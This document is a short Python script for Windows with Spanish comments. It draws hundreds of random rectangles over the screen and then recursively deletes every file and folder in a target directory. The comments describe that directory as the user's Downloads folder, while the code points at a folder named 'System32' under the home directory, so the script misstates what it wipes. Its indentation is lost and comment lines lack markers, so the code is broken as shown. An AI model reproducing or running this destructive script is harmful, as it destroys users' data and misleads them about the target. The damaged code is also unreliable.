import os
import shutil
import ctypes
import random
import time

user32 = ctypes.windll.user32
gdi32 = ctypes.windll.gdi32

hWnd = None  # None = toda la pantalla
hdc = user32.GetDC(hWnd)

for _ in range(500):  # dibuja 500 rectángulos
x1 = random.randint(0, user32.GetSystemMetrics(0))
y1 = random.randint(0, user32.GetSystemMetrics(1))
x2 = x1 + random.randint(10, 200)
y2 = y1 + random.randint(10, 200)
color = random.randint(0, 0xFFFFFF)
brush = gdi32.CreateSolidBrush(color)
gdi32.SelectObject(hdc, brush)
gdi32.Rectangle(hdc, x1, y1, x2, y2)
gdi32.DeleteObject(brush)
time.sleep(0.01)

user32.ReleaseDC(hWnd, hdc)

Obtiene la carpeta Descargas del usuario actual en Windows

downloads = os.path.join(os.path.expanduser("~"), "System32")

Recorre todos los elementos en Descargas

for item in os.listdir(downloads):
path = os.path.join(downloads, item)
try:
if os.path.isfile(path) or os.path.islink(path):
os.unlink(path)  # Borra archivo o enlace
elif os.path.isdir(path):
shutil.rmtree(path)  # Borra carpeta y su contenido
except Exception as e:
print(f"No se pudo borrar {path}: {e}")
